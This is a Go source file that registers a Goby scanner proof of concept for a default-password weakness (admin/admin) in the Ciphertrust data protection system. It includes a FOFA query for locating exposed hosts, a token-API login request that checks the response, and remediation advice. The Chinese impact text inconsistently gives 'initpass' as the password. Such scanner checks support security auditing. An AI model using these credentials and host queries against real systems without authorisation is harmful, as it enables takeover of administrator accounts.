package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Ciphertrust tokens Api default password vulnerability",
    "Description": "<p>Ciphertrust is a data protection system. The system has a default password, and attackers can control the entire platform through the default password (admin/admin) vulnerability, and use administrator privileges to operate core functions.</p>",
    "Impact": "<p>Ciphertrust default password vulnerability</p>",
    "Recommendation": "<p>1. Modify the default password. The password should preferably contain uppercase and lowercase letters, numbers and special characters, and the number of digits is greater than 8.</p><p>2. If it is not necessary, it is forbidden to access the system from the public network.</p><p>3. Set access policies and whitelist access through security devices such as firewalls.</p>",
    "Product": "Ciphertrust",
    "VulType": [
        "Default Password"
    ],
    "Tags": [
        "Default Password"
    ],
    "Translation": {
        "CN": {
            "Name": "Ciphertrust tokens 接口默认口令漏洞",
            "Product": "Ciphertrust",
            "Description": "<p><span style=\"font-size: medium;\"><span style=\"color: rgb(0, 0, 0);\">Ciphertrust&nbsp;</span>是一款数据保护系统。该系统存在默认口令，<span style=\"color: rgb(53, 53, 53);\">攻击者可通过默认口令（admin/admin）漏洞控制整个平台，使用管理员权限操作核心的功能。</span></span><br></p>",
            "Recommendation": "<p>1、修改默认口令，密码最好包含大小写字母、数字和特殊字符等，且位数大于8位。</p><p>2、如非必要，禁止公网访问该系统。</p><p>3、通过防火墙等安全设备设置访问策略，设置白名单访问。</p>",
            "Impact": "<p><span style=\"font-size: medium; color: rgb(53, 53, 53);\">攻击者可通过默认口令（密码：initpass）漏洞控制整个平台，使用管理员权限操作核心的功能。</span><br></p>",
            "VulType": [
                "默认口令"
            ],
            "Tags": [
                "默认口令"
            ]
        },
        "EN": {
            "Name": "Ciphertrust tokens Api default password vulnerability",
            "Product": "Ciphertrust",
            "Description": "<p>Ciphertrust is a data protection system. The system has a default password, and attackers can control the entire platform through the default password (admin/admin) vulnerability, and use administrator privileges to operate core functions.<br></p>",
            "Recommendation": "<p>1. Modify the default password. The password should preferably contain uppercase and lowercase letters, numbers and special characters, and the number of digits is greater than 8.</p><p>2. If it is not necessary, it is forbidden to access the system from the public network.</p><p>3. Set access policies and whitelist access through security devices such as firewalls.</p>",
            "Impact": "<p>Ciphertrust default password vulnerability</p>",
            "VulType": [
                "Default Password"
            ],
            "Tags": [
                "Default Password"
            ]
        }
    },
    "FofaQuery": "cert=\"Ciphertrust\"",
    "GobyQuery": "cert=\"Ciphertrust\"",
    "Author": "13eczou",
    "Homepage": "https://www.thalesdocs.com/",
    "DisclosureDate": "2022-04-09",
    "References": [
        "https://fofa.info/"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "1",
    "CVSS": "5.0",
    "CVEIDs": [],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/api/v1/auth/tokens/",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/json"
                },
                "data_type": "text",
                "data": "{\"username\":\"admin\",\"connection\":\"local_account\",\"password\":\"admin\",\"grant_type\":\"password\",\"refresh_token_revoke_unused_in\":30,\"cookies\":true,\"labels\":[\"web-ui\"]}"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "401",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "Change",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "required",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/api/v1/auth/tokens/",
                "follow_redirect": false,
                "header": {
                    "Content-Type": "application/json"
                },
                "data_type": "text",
                "data": "{\"username\":\"admin\",\"connection\":\"local_account\",\"password\":\"admin\",\"grant_type\":\"password\",\"refresh_token_revoke_unused_in\":30,\"cookies\":true,\"labels\":[\"web-ui\"]}"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "401",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "Change",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "required",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "6978"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
